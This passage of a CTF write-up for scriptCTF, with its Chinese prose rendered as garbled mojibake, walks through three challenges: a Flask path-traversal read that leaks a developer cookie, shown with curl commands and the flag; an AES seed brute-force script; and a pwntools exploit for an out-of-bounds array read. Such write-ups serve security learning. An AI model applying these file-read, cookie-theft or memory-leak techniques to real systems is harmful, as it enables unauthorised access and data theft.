    cookie = request.cookies.get("developer_secret_cookie")
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if correct == '':
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
    correct = open('./static/uploads/secrets/secret_cookie.txt').read()
    if cookie == correct:
        c = open('./static/uploads/secrets/secret_cookie.txt','w')
        c.write(sha256(os.urandom(16)).hexdigest())
        c.close()
        return f"Welcome! There is currently 1 unread message: {open('flag.txt').read()}"
    else:
        return "You are not a developer!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```
#### ä»£ç åˆ†æ
1. **æ–‡ä»¶ä¸Šä¼  (`/`)**
    
    - ç½‘ç«™ä¸»é¡µå…è®¸ç”¨æˆ·ä¸Šä¼ æ‰©å±•åä¸º `.jpg`, `.jpeg`, `.png` æˆ– `.svg` çš„å›¾ç‰‡æ–‡ä»¶ã€‚
        
    - å½“æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨ä¼šä¸ºå…¶ç”Ÿæˆä¸€ä¸ªå¯†ç å­¦å®‰å…¨çš„éšæœºå“ˆå¸Œå€¼ä½œä¸ºæ–°çš„æ–‡ä»¶åï¼Œä»¥é˜²æ­¢æ–‡ä»¶åå†²çªã€‚
        
    - æ–‡ä»¶è¢«ä¿å­˜åœ¨ `./static/uploads/` ç›®å½•ä¸‹ï¼Œæ ¼å¼ä¸º `{å“ˆå¸Œå€¼}.{åŸå§‹æ‰©å±•å}`ã€‚
        
    - æœ€åï¼ŒæœåŠ¡å™¨å°†ç”¨æˆ·é‡å®šå‘åˆ° `/render/` é¡µé¢ä»¥æ˜¾ç¤ºä¸Šä¼ çš„å›¾ç‰‡ã€‚
        
2. **å›¾ç‰‡æ¸²æŸ“ (`/render/<path:filename>`)**
    
    - è¿™ä¸ªç«¯ç‚¹çš„åŠŸèƒ½æ˜¯æ˜¾ç¤ºå·²ä¸Šä¼ çš„å›¾ç‰‡ã€‚
        
    - å®ƒä» URL ä¸­è·å–ä¸€ä¸ª `filename` å‚æ•°ã€‚æ­¤å¤„çš„è·¯ç”±ä½¿ç”¨äº† `<path:filename>` è½¬æ¢å™¨ï¼Œè¿™ä¸€ç‚¹è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒ**å…è®¸ `filename` å˜é‡ä¸­åŒ…å«æ–œæ ï¼ˆ`/`ï¼‰**ã€‚
        
    - ç„¶åï¼Œå®ƒæ¸²æŸ“ `display.html` æ¨¡æ¿ã€‚åœ¨è¿™ä¸ªæ¨¡æ¿ä¸­ï¼Œä¼šåˆ›å»ºä¸€ä¸ª `<iframe>`ï¼Œå…¶ `src` å±æ€§é€šè¿‡ç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥è®¾ç½®ä¸º `"/static/uploads/" + filename`ã€‚
        
3. **å¼€å‘è€…åŒºåŸŸ (`/developer`)**
    
    - è¿™æ˜¯åŒ…å« flag çš„ç›®æ ‡ç«¯ç‚¹ã€‚
        
    - å¯¹è¯¥åŒºåŸŸçš„è®¿é—®ç”±ä¸€ä¸ªåä¸º `developer_secret_cookie` çš„ Cookie è¿›è¡Œä¿æŠ¤ã€‚
        
    - æœåŠ¡å™¨ä¼šå°†ç”¨æˆ·è¯·æ±‚ä¸­çš„ Cookie å€¼ä¸å­˜å‚¨åœ¨ `./static/uploads/secrets/secret_cookie.txt` æ–‡ä»¶ä¸­çš„ç§˜å¯†å€¼è¿›è¡Œæ¯”è¾ƒã€‚

#### æ¼æ´åˆ©ç”¨ç‚¹

1. ç›®å½•ä»»æ„è¯»å–
	
	- `/render/`è·¯ç”±å¯ä»¥è¯»å–æ–‡ä»¶  
	
2. è®¾ç½® Cookie å¹¶è®¿é—®`/developer` è·¯ç”±  
	
	- è¯»å–Cookieæ–‡ä»¶åï¼Œæºå¸¦Cookieæ–‡ä»¶å»è®¿é—®`/developer` è·¯ç”±  

```bash
http://play.scriptsorcerers.xyz:10118/render/secrets/secret_cookie.txt

cookie:d4b2b8e4bf13c506d73d831c73792e9b80eb1d03ae09ab52d0415446516a8a4a

curl --cookie "developer_secret_cookie=d4b2b8e4bf13c506d73d831c73792e9b80eb1d03ae09ab52d0415446516a8a4a" http://play.scriptsorcerers.xyz:10118/developer

Welcome! There is currently 1 unread message: scriptCTF{my_c00k135_4r3_n0t_s4f3!_e19acf366f43}
```

## Reverse
### Plastic Shield

mainå‡½æ•°  
![](assets/img/attachments/QQ_1755425015634.png)  

AES_init_ctx_iv  
![](assets/img/attachments/QQ_1755425109709.png)

KeyExpansion  
![](assets/img/attachments/QQ_1755425145384.png)  
![](assets/img/attachments/QQ_1755425152435.png)  


- ç¨‹åºè¯»å–å£ä»¤ `s`ï¼Œå–ç´¢å¼• `âŒŠ0.6*len(s)âŒ‹` å¤„çš„ **ä¸€ä¸ªå­—èŠ‚**ï¼ˆå•ä¸ªå­—ç¬¦ï¼‰ä½œä¸ºç§å­ã€‚
    
- å¯¹è¯¥å•å­—èŠ‚åš `BLAKE2b`ï¼ˆè¾“å‡º 64 å­—èŠ‚ï¼‰ï¼Œç„¶åæŠŠå…¶ **å‰ 32 å­—èŠ‚**å½“æˆ AES å¯†é’¥ã€‚
	
- IV çš„æ¥æºåœ¨åç¼–è¯‘é‡Œçœ‹èµ·æ¥æœ‰ç‚¹â€œè¿·ç¦»â€ï¼ˆæœ‰ä¸ªæ•°ç»„åªå¯¹ index=64 ä½ç½®åšäº†å†™ 0ï¼‰ï¼Œå¸¸è§è®¾è®¡æ˜¯æŠŠå“ˆå¸Œç»“æœçš„ **åç»­ 16 å­—èŠ‚**å½“ä½œ IVã€‚ä½†ä¹Ÿå¯èƒ½æ˜¯ 0 IV æˆ–å…¶å®ƒåˆ‡ç‰‡ã€‚
    
- AES å¯†é’¥æ‰©å±•é€»è¾‘ä¸ Rcon è¡¨ç¬¦åˆ **AES-256**ï¼ˆ`KeyExpansion` é‡Œå…ˆæ‹· 8 ä¸ª wordï¼Œå¾ªç¯åˆ° 0x3Bï¼Œä¸”æ¯ 8 ä¸ª word åšä¸€æ¬¡ Rcon / SubWordï¼‰ã€‚

å› æ­¤ç ´è§£æ€è·¯å¾ˆç®€å•ï¼š**ä¸éœ€è¦çŸ¥é“å®Œæ•´å£ä»¤**ï¼Œç›´æ¥æšä¸¾è¿™ä¸ªâ€œå•å­—èŠ‚ç§å­â€ï¼ˆ0ï½255ï¼‰ï¼Œå¯¹æ¯ä¸ªç§å­æ±‚ BLAKE2bï¼Œå–å‰ 32 å­—èŠ‚ä¸º keyï¼Œç„¶åå°è¯•ä¸åŒ IV å–æ³•å»è§£å¯†è¿™æ®µå›ºå®šå¯†æ–‡ï¼ŒéªŒè¯ PKCS#7 å¡«å……å¹¶ç­›é€‰å¯è¯»æ˜æ–‡ã€‚

exp  
```python
from hashlib import blake2b
from Crypto.Cipher import AES

# å›ºå®šå¯†æ–‡ï¼ˆé¢˜ç›®é‡Œç»™çš„ hexï¼‰
CT_HEX = (
    "713d7f2c0f502f485a8af0c284bd3f1e7b03d27204a616a8340beaae23f130ed"
    "f65401c1f99fe99f63486a385ccea217"
)
ct = bytes.fromhex(CT_HEX)

def unpad(data: bytes) -> bytes:
    """å»æ‰ PKCS#7 å¡«å……"""
    pad = data[-1]
    if pad == 0 or pad > 16 or data[-pad:] != bytes([pad])*pad:
        raise ValueError("bad padding")
    return data[:-pad]

for seed in range(256):  # ç©·ä¸¾å•å­—èŠ‚ç§å­ 0~255
    h = blake2b(bytes([seed]), digest_size=64).digest()
    key = h[:32]         # AES-256 å¯†é’¥
    ivs = [h[32:48],     # å¸¸è§ï¼šå“ˆå¸Œçš„å 16 å­—èŠ‚
           h[:16],       # å‰ 16 å­—èŠ‚
           bytes(16)]    # å…¨ 0 IV

    for iv in ivs:
        try:
            pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
            pt = unpad(pt)
            # è¿‡æ»¤ï¼šæ˜æ–‡é‡Œå¤§éƒ¨åˆ†åº”å¯æ‰“å°
            if all(32 <= c < 127 or c in (10,13) for c in pt):
                print(f"Seed={seed}, IV={ivs.index(iv)} => {pt.decode(errors='ignore')}")
        except Exception:
            pass
```


## PWN
### Index
mainå‡½æ•°  
![](assets/img/attachments/QQ_1755437528842.png)  

menuå‡½æ•°ï¼Œèœå•å‡½æ•°  
![](assets/img/attachments/QQ_1755437653635.png)  

mainè¿™é‡Œè¯»å–äº†flag.txtä½†æ˜¯æ²¡æœ‰è¾“å‡º  
![](assets/img/attachments/QQ_1755437680514.png)  

read_dataå‡½æ•°  
![](assets/img/attachments/QQ_1755437744223.png)  
è¯»å–ç„¶åè¾“å‡º  

store_dataå‡½æ•°  
![](assets/img/attachments/QQ_1755437767238.png)  
è¯»å–ç„¶åè¾“å‡º  
`fgets` é™åˆ¶é•¿åº¦ â†’ é˜²æ­¢ç›´æ¥æ ˆæº¢å‡ºã€‚

print_flagå‡½æ•°  
![](assets/img/attachments/QQ_1755437899857.png)  
æ²¡å•¥ç”¨ï¼Œè¾“å‡ºä¸€å†™ä¸œè¥¿ï¼Œæ²¡æœ‰è°ƒç”¨flagçš„åœ°æ–¹   

#### æ¼æ´ç‚¹

- `read_data()` æ²¡æœ‰è¾¹ç•Œæ£€æŸ¥ã€‚
    
- é€šè¿‡è®¡ç®—ï¼š`idx = (flag_addr - nums_addr) // 8` å¯ä»¥ç›´æ¥è¯»å– `nums` æ•°ç»„åçš„ `flag` å†…å®¹ã€‚
	
- flag å†…å®¹å­˜å‚¨åœ¨ `flag` å˜é‡ä¸­ï¼Œç¨‹åºä¼šåœ¨ `1337` é€‰é¡¹è§¦å‘è¯»å–åˆ°å†…å­˜ã€‚
    
- `read_data()` å¯ä»¥æŒ‰ç´¢å¼•è¯»å– `nums` æ•°ç»„çš„æ•°æ®ã€‚
    
- `nums` æ˜¯æ•°ç»„ï¼Œ`flag` åœ¨å®ƒåé¢ â†’ å¯ä»¥é€šè¿‡è¶Šç•Œç´¢å¼•è¯»å– flagã€‚


#### å‡½æ•°è°ƒç”¨æµç¨‹å›¾

```mermaid
graph TD
    A["main()"] --> B[æ˜¾ç¤ºèœå•]
    B --> |è¾“å…¥ 1| C["store_data()"]
    B --> |è¾“å…¥ 2| D["read_data()"]
    B --> |è¾“å…¥ 3| E["print_flag()"]
    B --> |è¾“å…¥ 4| F["exit()"]
    B --> |è¾“å…¥ 1337| G["load_flag_to_memory()"]
    G --> H[flag.txt -> flag å†…å­˜]
```

#### å†…å­˜å¸ƒå±€ + è¶Šç•Œç´¢å¼•ç¤ºæ„å›¾

```mermaid
graph LR
    subgraph Memory
        N0["nums[0]"] --> N1["nums[1]"]
        N1 --> N2["nums[2]"]
        N2 --> N3["nums[3]"]
        N3 --> N4["nums[4]"]
        N4 --> N5["nums[5]"]
        N5 --> N6["nums[6]"]
        N6 --> N7["nums[7]"]
        N7 --> N8["nums[8]"] --> F["flag (flag.txt å†…å®¹)"]
    end

    N8 -.-> |è¶Šç•Œè¯»å–| D

```
#### æ”»å‡»æ€è·¯

1. å‘é€ `1337`ï¼Œè§¦å‘ flag åŠ è½½åˆ°å†…å­˜ã€‚
    
2. è®¡ç®— `idx = (flag_addr - nums_addr) // 8`ã€‚
    
3. é€‰æ‹© `read_data()`ï¼Œè¾“å…¥ idx è¶Šç•Œè¯»å– flagã€‚

exp  
```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# --------------------------
# é…ç½®
# --------------------------
BIN = "./index"      # æœ¬åœ° binary
HOST = "play.scriptsorcerers.xyz"
PORT = 10108

p = remote(HOST, PORT)
elf = ELF(BIN)

# --------------------------
# è·å–å†…å­˜åœ°å€
# --------------------------
nums_addr = elf.symbols['nums']    # nums æ•°ç»„åŸºå€
flag_addr = elf.symbols['flag']    # flag å­˜å‚¨åœ°å€

log.info(f"nums base: {hex(nums_addr)}")
log.info(f"flag addr: {hex(flag_addr)}")

# --------------------------
# è®¡ç®—è¶Šç•Œç´¢å¼•
# --------------------------
idx = (flag_addr - nums_addr) // 8
log.info(f"è¶Šç•Œç´¢å¼• idx = {idx}")

# --------------------------
# è§¦å‘ flag åŠ è½½
# --------------------------
p.recvuntil(b"4. Exit\n")
p.sendline(b"1337")  # ç‰¹æ®Šè¾“å…¥è®©ç¨‹åºæŠŠ flag è¯»å–åˆ°å†…å­˜

# --------------------------
# é€šè¿‡ read_data è¶Šç•Œè¯»å– flag
# --------------------------
p.recvuntil(b"4. Exit\n")
p.sendline(b"2")  # é€‰æ‹© read_data
p.recvuntil(b"Index: ")
p.sendline(str(idx).encode())

# --------------------------
# è¯»å–è¾“å‡º
# --------------------------
flag_data = b""
try:
    while True:
        chunk = p.recv(timeout=0.5)
        if not chunk:
            break
        flag_data += chunk
except EOFError:
    pass

# è§£æè¾“å‡º
flag_text = flag_data.decode(errors='ignore')
# å»æ‰å¤šä½™çš„èœå•
flag_text = flag_text.replace("Data: ", "").split("1. Store data")[0].strip()

print("---- FLAG ----")
print(flag_text)
print("----------------")

p.close()

```